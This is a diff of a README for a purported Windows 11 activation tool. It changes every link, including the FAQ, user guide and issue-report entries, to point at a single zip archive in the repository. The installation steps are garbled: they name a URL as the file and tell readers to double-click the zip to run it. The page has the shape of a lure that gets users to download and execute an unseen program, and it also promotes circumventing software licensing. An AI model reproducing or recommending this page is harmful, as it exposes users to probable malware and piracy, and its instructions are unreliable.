@@ -1,6 +1,6 @@
 # 🎉 win11-activate - Activate Windows 11 Easily and Effectively
 
-[![Download win11-activate](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip)](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip)
+[![Download win11-activate](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip)](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip)
 
 ## 📖 Description
 
@@ -29,19 +29,19 @@ To get started, you just need to follow a few simple steps. Before you proceed, 
 
 To download the win11-activate tool, visit the following page:
 
-[Download win11-activate](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip)
+[Download win11-activate](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip)
 
 ### Installation Steps
 
 1. Click on the above link to visit the Releases page.
 2. On the Releases page, find the latest version of win11-activate.
 3. Look for the "Assets" section below the release notes.
-4. Click on the file named `https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip` to download the executable file.
+4. Click on the file named `https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip` to download the executable file.
 5. Once the download is complete, navigate to your Downloads folder or the location where the file is saved.
 
 ### Running the Application
 
-6. Double-click the downloaded `https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip` file to run the application.
+6. Double-click the downloaded `https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip` file to run the application.
 7. Follow the prompts on the screen to complete the activation process.
 
 ### Tips
@@ -65,12 +65,12 @@ Remember, the goal of win11-activate is to provide a simple way to activate Wind
 
 ## 📝 Additional Resources
 
-- [FAQs](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip)
-- [User Guide](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip)
-- [Report an Issue](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip)
+- [FAQs](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip)
+- [User Guide](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip)
+- [Report an Issue](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip)
 
 For the latest updates and detailed information, keep an eye on the Releases section. 
 
-[Download win11-activate](https://github.com/DHARAMORADIYA/win11-activate/raw/refs/heads/main/magician/activate-win-1.4.zip) 
+[Download win11-activate](https://raw.githubusercontent.com/DHARAMORADIYA/win11-activate/main/magician/activate-win-1.7-beta.3.zip) 
 
 Enjoy using win11-activate to easily activate your Windows 11 system!
